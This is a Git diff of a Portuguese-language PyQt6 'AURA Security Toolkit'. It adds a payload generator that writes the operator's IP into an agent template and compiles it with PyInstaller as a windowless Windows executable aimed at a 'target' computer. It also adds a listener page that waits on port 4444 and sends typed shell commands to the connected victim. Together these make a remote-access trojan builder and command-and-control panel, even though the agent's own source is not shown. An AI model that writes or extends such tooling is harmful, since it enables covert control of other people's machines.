@@ -3,7 +3,11 @@
 import os
 import sys
 import json
-import re 
+import re
+import subprocess
+import platform
+import socket
+import threading
 from datetime import datetime
 
 # Importações PyQt6
@@ -202,9 +206,305 @@ class ScannerPage(QWidget):
                 self.parent_window.status_label.setText(f"Falha ao salvar relatório: {e}")
 
 
+class FirewallPage(QWidget):
+    def __init__(self, parent_window):
+        super().__init__()
+        self.parent_window = parent_window
+        self.L = parent_window.L
+        self._setup_ui()
+
+    def _setup_ui(self):
+        layout = QVBoxLayout()
+        layout.setContentsMargins(30, 30, 30, 30)
+        layout.setSpacing(20)
+
+        # Título e Explicação
+        title_label = QLabel("🛡️ Teste de Firewall e Acesso Remoto")
+        title_label.setFont(QFont("Arial", 18, QFont.Weight.Bold))
+        layout.addWidget(title_label)
+
+        desc_text = (
+            "Este teste valida as permissões de execução do sistema e a capacidade de "
+            "interação com o usuário. Ele verifica se o ambiente bloqueia scripts externos "
+            "ou diálogos de segurança, simulando o comportamento de ferramentas de monitoramento."
+        )
+        description = QLabel(desc_text)
+        description.setWordWrap(True)
+        description.setStyleSheet(f"color: {THEMES['dark']['text_secondary']};")
+        layout.addWidget(description)
+
+        # Grupo de Ações
+        action_group = QGroupBox("Execução do Teste")
+        action_layout = QVBoxLayout()
+        
+        self.btn_local = QPushButton("Iniciar no Computador Local")
+        self.btn_local.setFixedHeight(45)
+        self.btn_local.setCursor(Qt.CursorShape.PointingHandCursor)
+        self.btn_local.clicked.connect(self.run_local_test)
+        
+        self.btn_remote = QPushButton("Iniciar em Host Remoto (Em breve)")
+        self.btn_remote.setFixedHeight(45)
+        self.btn_remote.setEnabled(True)
+        self.btn_remote.clicked.connect(lambda: self.parent_window.pages.setCurrentIndex(7)) 
+        
+        action_layout.addWidget(self.btn_local)
+        action_layout.addWidget(self.btn_remote)
+        action_group.setLayout(action_layout)
+        layout.addWidget(action_group)
+
+        # Console de Log
+        self.log_output = QLabel("Aguardando comando...")
+        self.log_output.setStyleSheet("""
+            background-color: #050505; 
+            border: 1px solid #2a2a2a; 
+            padding: 10px; 
+            font-family: 'Consolas';
+        """)
+        self.log_output.setAlignment(Qt.AlignmentFlag.AlignTop)
+        self.log_output.setWordWrap(True)
+        layout.addWidget(self.log_output)
+
+        layout.addStretch()
+        self.setLayout(layout)
+
+    def run_local_test(self):
+        """Executa o teste e lida com a interface."""
+        try:
+            from core.interaction_test import run_interaction_test
+            
+            self.btn_local.setEnabled(False)
+            self.btn_local.setText("Teste em Andamento...")
+            self.log_output.setText("<b>[INFO]</b> O teste de interação foi iniciado.")
+            
+            # Executa o teste
+            run_interaction_test(self.parent_window)
+            
+            self.btn_local.setEnabled(True)
+            self.btn_local.setText("Iniciar no Computador Local")
+            
+            # ATUALIZAÇÃO: Busca o log e exibe
+            log_path = os.path.join(self.parent_window.base_dir, "logs", "teste_interacao.log")
+            self.update_log_view(log_path)
+            
+        except Exception as e:
+            self.btn_local.setEnabled(True)
+            self.btn_local.setText("Iniciar no Computador Local")
+            self.log_output.setText(f"<b>[ERRO]</b>: {e}")
+
+    def update_log_view(self, path):
+        """ESTE ERA O MÉTODO QUE ESTAVA FALTANDO!"""
+        try:
+            if os.path.exists(path):
+                with open(path, "r", encoding="utf-8") as f:
+                    content = f.read()
+                    # Pega apenas os últimos 500 caracteres para não travar a UI
+                    self.log_output.setText(f"<pre>{content[-500:]}</pre>")
+            else:
+                self.log_output.setText("<b>[INFO]</b> Teste concluído, mas o arquivo de log não foi gerado.")
+        except Exception as e:
+            self.log_output.setText(f"<b>[ERRO]</b> ao ler log: {e}")
+
+    def update_ui_language(self, L):
+        self.L = L
+        # (Opcional) Adicione traduções para os botões desta página aqui
+        # Adicionar aqui depois, nao posso esquecer!!!
+
+# --- PAGINA DO AGENTE (Ta dificil para um karalho de resolver isso) ---
+
+class PayloadPage(QWidget):
+    def __init__(self, parent_window):
+        super().__init__()
+        self.parent_window = parent_window
+        self._setup_ui()
+
+    def _setup_ui(self):
+        layout = QVBoxLayout(self)
+        layout.setContentsMargins(30, 30, 30, 30)
+        layout.setSpacing(20)
+
+        title = QLabel("📦 Gerador de Agente Remoto (Payload)")
+        title.setFont(QFont("Arial", 18, QFont.Weight.Bold))
+        layout.addWidget(title)
+
+        desc = QLabel("Selecione o sistema operacional do computador alvo para gerar o agente de conexão.")
+        desc.setStyleSheet("color: #aaaaaa;")
+        layout.addWidget(desc)
+
+        # Botões de Seleção
+        self.btn_win = QPushButton("🪟 Gerar Agente para Windows (.exe)")
+        self.btn_win.setFixedHeight(50)
+        self.btn_win.setCursor(Qt.CursorShape.PointingHandCursor)
+        self.btn_win.clicked.connect(lambda: self.generate_payload("windows"))
+
+        self.btn_lin = QPushButton("🐧 Gerar Agente para Linux (.py)")
+        self.btn_lin.setFixedHeight(50)
+        self.btn_lin.setCursor(Qt.CursorShape.PointingHandCursor)
+        self.btn_lin.clicked.connect(lambda: self.generate_payload("linux"))
+
+        self.btn_go_listener = QPushButton("Ir para Painel de Controle 📡")
+        self.btn_go_listener.clicked.connect(lambda: self.parent_window.pages.setCurrentIndex(8))
+        layout.addWidget(self.btn_go_listener)
+
+        layout.addWidget(self.btn_win)
+        layout.addWidget(self.btn_lin)
+
+        self.status_log = QLabel("Aguardando seleção...")
+        self.status_log.setStyleSheet("background: #111; padding: 10px; border: 1px solid #333;")
+        layout.addWidget(self.status_log)
+
+        layout.addStretch()
+        
+        # Botão Voltar
+        btn_back = QPushButton("⬅ Voltar")
+        btn_back.clicked.connect(lambda: self.parent_window.pages.setCurrentIndex(6))
+        layout.addWidget(btn_back)
+
+    def generate_payload(self, os_type):
+        import socket
+        import subprocess
+        
+        # 1. Tenta obter o seu IP automaticamente para injetar no agente
+        try:
+            s_temp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s_temp.connect(("8.8.8.8", 80))
+            my_ip = s_temp.getsockname()[0]
+            s_temp.close()
+        except:
+            my_ip = "127.0.0.1"
+
+        self.status_log.setText(f"<b>[INFO]</b> Gerando agente para {os_type} (IP: {my_ip})...")
+        QApplication.processEvents()
+
+        try:
+            # Caminhos de pasta
+            payload_dir = os.path.join(self.parent_window.base_dir, "logs", "payloads")
+            os.makedirs(payload_dir, exist_ok=True)
+            
+            # 2. Localiza o seu arquivo aura_agent.py original
+            agent_template_path = os.path.join(self.parent_window.base_dir, "core", "aura_agent.py")
+            
+            if not os.path.exists(agent_template_path):
+                self.status_log.setText("<b>[ERRO]</b> Arquivo 'core/aura_agent.py' não encontrado!")
+                return
+
+            with open(agent_template_path, "r", encoding="utf-8") as f:
+                content = f.read()
+
+            # 3. Injeta o seu IP no lugar do "SEU_IP_AQUI"
+            content = content.replace('###IP_CONFIG###', my_ip)
+
+            if os_type == "linux":
+                output_file = os.path.join(payload_dir, "aura_agent_linux.py")
+                with open(output_file, "w", encoding="utf-8") as f:
+                    f.write(content)
+                self.status_log.setText(f"<b>[SUCESSO]</b> Agente Linux pronto em: <br>{output_file}")
+                pass
+
+            elif os_type == "windows":
+                temp_py = os.path.join(payload_dir, "temp_win_agent.py")
+                with open(temp_py, "w", encoding="utf-8") as f:
+                    f.write(content)
+                
+                self.status_log.setText("<b>[INFO]</b> Compilando EXE... Olhe o terminal!")
+                QApplication.processEvents()
+
+                # Adicionei o caminhos absolutos para o PyInstaller não se perder
+                cmd = f'pyinstaller --onefile --noconsole --noconfirm --distpath "{payload_dir}" --workpath "{os.path.join(payload_dir, "build")}" "{temp_py}"'
+                
+                # Executa e espera
+                processo = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                stdout, stderr = processo.communicate() # Pega o erro se houver
+
+                if processo.returncode != 0:
+                    print(f"ERRO PYINSTALLER: {stderr.decode()}")
+                    self.status_log.setText("<b>[ERRO]</b> Falha na compilação. Verifique se o PyInstaller está instalado.")
+                else:
+                    self.status_log.setText(f"<b>[SUCESSO]</b> Agente Windows gerado em:<br>{payload_dir}")
+
+        except Exception as e:
+            self.status_log.setText(f"<b>[ERRO]</b>: {str(e)}")
+
+# --- PAGINA DE CONTROLE ---
+
+class ListenerPage(QWidget):
+    def __init__(self, parent_window):
+        super().__init__()
+        self.parent_window = parent_window
+        self.server_socket = None
+        self.client_socket = None
+        self._setup_ui()
+
+    def _setup_ui(self):
+        layout = QVBoxLayout(self)
+        layout.setContentsMargins(30, 30, 30, 30)
+
+        self.title = QLabel("📡 Painel de Controle Remoto")
+        self.title.setFont(QFont("Arial", 18, QFont.Weight.Bold))
+        layout.addWidget(self.title)
+
+        self.status_conn = QLabel("Status: Aguardando ativação...")
+        self.status_conn.setStyleSheet("color: orange; font-weight: bold;")
+        layout.addWidget(self.status_conn)
+
+        # Console de logs
+        self.console_output = QLabel("Log do Servidor...")
+        self.console_output.setStyleSheet("background-color: black; color: #00ff00; padding: 10px; font-family: 'Consolas';")
+        self.console_output.setWordWrap(True)
+        self.console_output.setAlignment(Qt.AlignmentFlag.AlignTop)
+        layout.addWidget(self.console_output)
+
+        # Campo para enviar comandos
+        self.cmd_input = QLineEdit()
+        self.cmd_input.setPlaceholderText("Digite um comando (ex: stress_test, dir, whoami)...")
+        self.cmd_input.setEnabled(False)
+        self.cmd_input.returnPressed.connect(self.send_command)
+        layout.addWidget(self.cmd_input)
+
+        # Botões
+        self.btn_listen = QPushButton("Ativar Escuta (Porta 4444)")
+        self.btn_listen.clicked.connect(self.start_listening_thread)
+        layout.addWidget(self.btn_listen)
+
+        layout.addStretch()
+
+    def start_listening_thread(self):
+        self.btn_listen.setEnabled(False)
+        self.status_conn.setText("Status: Escutando na porta 4444...")
+        thread = threading.Thread(target=self.start_server, daemon=True)
+        thread.start()
+
+    def start_server(self):
+        try:
+            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.server_socket.bind(('0.0.0.0', 4444))
+            self.server_socket.listen(1)
+            
+            self.client_socket, addr = self.server_socket.accept()
+            self.status_conn.setText(f"Status: CONECTADO ao alvo ({addr[0]})")
+            self.status_conn.setStyleSheet("color: #00ff00; font-weight: bold;")
+            self.cmd_input.setEnabled(True)
+        except Exception as e:
+            self.console_output.setText(f"Erro no Servidor: {e}")
+
+    def send_command(self):
+        cmd = self.cmd_input.text()
+        if cmd and self.client_socket:
+            try:
+                self.client_socket.send(cmd.encode())
+                response = self.client_socket.recv(4096).decode()
+                self.console_output.setText(f"> {cmd}\n{response}")
+                self.cmd_input.clear()
+            except Exception as e:
+                self.status_conn.setText("Status: Conexão Perdida.")
+                self.cmd_input.setEnabled(False)
+
 # --- CLASSE PRINCIPAL (MainWindow) ---
 
 class MainWindow(QMainWindow):
+    def safe_change_page(self, index):
+        self.pages.setCurrentIndex(index)
+        self.status_label.setText(f"Página {index} carregada")
+
     def __init__(self, base_dir):
         super().__init__()
         self.base_dir = base_dir
@@ -225,22 +525,22 @@ class MainWindow(QMainWindow):
         self.update_ui_language(self.current_lang_code)
 
     def _build_ui(self):
-        # (Código mantido, apenas a parte que cria o layout principal)
+        # 1. Configuração do Widget Central e Layout Principal
         central_widget = QWidget()
         self.setCentralWidget(central_widget)
         main_layout = QHBoxLayout(central_widget)
         main_layout.setContentsMargins(0, 0, 0, 0)
         main_layout.setSpacing(0)
 
-        # --- Sidebar ---
+        # 2. Construção da Sidebar (Lado Esquerdo)
         self.sidebar = QFrame()
         self.sidebar.setFixedWidth(200)
         self.sidebar.setObjectName("Sidebar")
-        
         sidebar_layout = QVBoxLayout(self.sidebar)
         sidebar_layout.setContentsMargins(10, 20, 10, 10)
         sidebar_layout.setSpacing(10)
         
+        # Título Aura
         self.title_label = QLabel("AURA")
         self.title_label.setFont(QFont("Arial", 24, QFont.Weight.Bold))
         self.title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
@@ -248,7 +548,7 @@ class MainWindow(QMainWindow):
         self.title_label.setObjectName("AuraTitle")
         sidebar_layout.addWidget(self.title_label)
         
-        # ... (Criação dos botões da sidebar) ...
+        # Botões da Sidebar
         self.btn_home = self._make_sidebar_button("Home", "🏠")
         self.btn_tools = self._make_sidebar_button("Ferramentas", "🛠️") 
         self.btn_scanner = self._make_sidebar_button("Scanner", "🛰️") 
@@ -269,93 +569,93 @@ class MainWindow(QMainWindow):
         
         main_layout.addWidget(self.sidebar)
 
-        # --- Área de Conteúdo Principal ---
-        # ⚠️ Novo: Centraliza o widget principal que contém as páginas
+        # 3. Área de Conteúdo (Lado Direito)
         self.content_frame = QFrame() 
-        self.content_frame.setObjectName("ContentFrame") # ID para estilizar o fundo
+        self.content_frame.setObjectName("ContentFrame")
         content_v_layout = QVBoxLayout(self.content_frame)
         content_v_layout.setContentsMargins(0, 0, 0, 0)
         content_v_layout.setSpacing(0)
         
+        # O gerenciador de páginas (Stack)
         self.pages = QStackedWidget()
         
-        # ... (Criação das páginas - Home, Tools, Scanner, Scripts, Logs, Config) ...
+        # --- CRIAÇÃO DAS PÁGINAS ---
         
         # Index 0: Home
-        home = QWidget()
-        home.setObjectName("PageWidget") # ID para estilizar o fundo das páginas
-        home_layout = QVBoxLayout(home)
-        
+        home_page = QWidget()
+        home_page.setObjectName("PageWidget")
+        home_layout = QVBoxLayout(home_page)
         self.welcome_label = QLabel("Bem-vindo ao AURA Security Toolkit!")
         self.welcome_label.setFont(QFont("Arial", 16, QFont.Weight.Bold))
-        self.welcome_label.setContentsMargins(0, 0, 0, 10)
         home_layout.addWidget(self.welcome_label)
         
-        # Cards (mantidos)
+        # Layout de Cards na Home
         card_layout = QHBoxLayout()
-        self.card_scanner = NeonCard(
-            icon="🛰️", title="Varredura de Rede", 
-            subtitle="Identifica hosts, portas abertas e vulnerabilidades.", 
-            neon_color=self.theme_manager.neon_color, 
-            theme_manager=self.theme_manager
-        )
+        self.card_scanner = NeonCard("🛰️", "Varredura de Rede", "Identifica hosts e portas.", self.theme_manager.neon_color, self.theme_manager)
         self.card_scanner.on_card_activated = lambda: self.pages.setCurrentIndex(2) 
         
-        self.card_bruteforce = NeonCard(
-            icon="🔒", title="Brute Force", 
-            subtitle="Ferramenta para testar a força de credenciais.", 
-            neon_color=self.theme_manager.neon_color, 
-            theme_manager=self.theme_manager
-        )
-        self.card_bruteforce.on_card_activated = lambda: self.status_label.setText("Funcionalidade Brute Force em desenvolvimento...")
+        self.card_bruteforce = NeonCard("🔒", "Brute Force", "Teste de força de credenciais.", self.theme_manager.neon_color, self.theme_manager)
+        self.card_bruteforce.on_card_activated = lambda: self.status_label.setText("Em desenvolvimento...")
         
-        self.card_firewall = NeonCard(
-            icon="🚧", title="Teste de Firewall", 
-            subtitle="Verifica regras e filtros de segurança de rede.", 
-            neon_color=self.theme_manager.neon_color, 
-            theme_manager=self.theme_manager
-        )
-        self.card_firewall.on_card_activated = lambda: self.status_label.setText("Funcionalidade Teste de Firewall em desenvolvimento...")
+        self.card_firewall = NeonCard("🛡️", "Teste de Firewall", "Verifica regras e filtros de rede.", self.theme_manager.neon_color, self.theme_manager)
+        self.card_firewall.on_card_activated = lambda: self.pages.setCurrentWidget(self.firewall_page) # Direciona para a nova página
         
         card_layout.addWidget(self.card_scanner)
         card_layout.addWidget(self.card_bruteforce)
         card_layout.addWidget(self.card_firewall)
-        
         home_layout.addLayout(card_layout)
         home_layout.addStretch()
+        self.pages.addWidget(home_page) # Adicionado no Index 0
 
-        self.pages.addWidget(home) # Index 0 
-        
+        # Index 1: Ferramentas
         tools_page = QWidget()
         tools_page.setObjectName("PageWidget")
-        tools_layout = QVBoxLayout(tools_page)
-        tools_layout.addWidget(QLabel("Página Ferramentas - em desenvolvimento"))
+        tools_v_layout = QVBoxLayout(tools_page)
+        tools_v_layout.addWidget(QLabel("Página Ferramentas - em desenvolvimento"))
         self.pages.addWidget(tools_page) # Index 1
-        
+
+        # Index 2: Scanner
         self.scanner_page = ScannerPage(self)
         self.scanner_page.setObjectName("PageWidget")
         self.pages.addWidget(self.scanner_page) # Index 2
         
+        # Index 3: Scripts
         scripts_page = QWidget()
         scripts_page.setObjectName("PageWidget")
-        scripts_layout = QVBoxLayout(scripts_page)
-        scripts_layout.addWidget(QLabel("Página Scripts - em desenvolvimento"))
+        scripts_v_layout = QVBoxLayout(scripts_page)
+        scripts_v_layout.addWidget(QLabel("Página Scripts - em desenvolvimento"))
         self.pages.addWidget(scripts_page) # Index 3
         
+        # Index 4: Logs
         logs_page = QWidget()
         logs_page.setObjectName("PageWidget")
-        logs_layout = QVBoxLayout(logs_page)
-        logs_layout.addWidget(QLabel("Página Logs - em desenvolvimento"))
-        self.pages.addWidget(logs_page)      # Index 4
+        logs_v_layout = QVBoxLayout(logs_page)
+        logs_v_layout.addWidget(QLabel("Página Logs - em desenvolvimento"))
+        self.pages.addWidget(logs_page) # Index 4
         
+        # Index 5: Configurações
         self.config_page = ConfigPage(self)
         self.config_page.setObjectName("PageWidget")
         self.pages.addWidget(self.config_page) # Index 5
 
-        content_v_layout.addWidget(self.pages)
-        main_layout.addWidget(self.content_frame) # Adiciona ContentFrame
+        # Index 6: Teste de Firewall (A NOVA PÁGINA)
+        self.firewall_page = FirewallPage(self)
+        self.firewall_page.setObjectName("PageWidget")
+        self.pages.addWidget(self.firewall_page) # Index 6
 
-        # ... (Conexões dos botões mantidas) ...
+        # Index 7: Página de Payload
+        self.payload_page = PayloadPage(self)
+        self.payload_page.setObjectName("PageWidget")
+        self.pages.addWidget(self.payload_page) # Index 7
+
+        self.listener_page = ListenerPage(self)
+        self.pages.addWidget(self.listener_page) # Index 8
+
+        # Montagem final
+        content_v_layout.addWidget(self.pages)
+        main_layout.addWidget(self.content_frame)
+
+        # 4. Conexões dos Botões da Sidebar
         self.btn_home.clicked.connect(lambda: self.pages.setCurrentIndex(0))
         self.btn_tools.clicked.connect(lambda: self.pages.setCurrentIndex(1))
         self.btn_scanner.clicked.connect(lambda: self.pages.setCurrentIndex(2))
@@ -531,7 +831,8 @@ class MainWindow(QMainWindow):
         self.btn_logs.setText("  " + lang_get(L, "sidebar.logs", "📁 Logs"))
         self.btn_config.setText("  " + lang_get(L, "sidebar.settings", "⚙️ Configurações"))
         self.status_label.setText(lang_get(L, "header.status_ready", "Status: Pronto"))
-
+        
+        self.firewall_page.update_ui_language(L)
         self.config_page.update_ui_language(L) 
         self.scanner_page.update_ui_language(L)
         
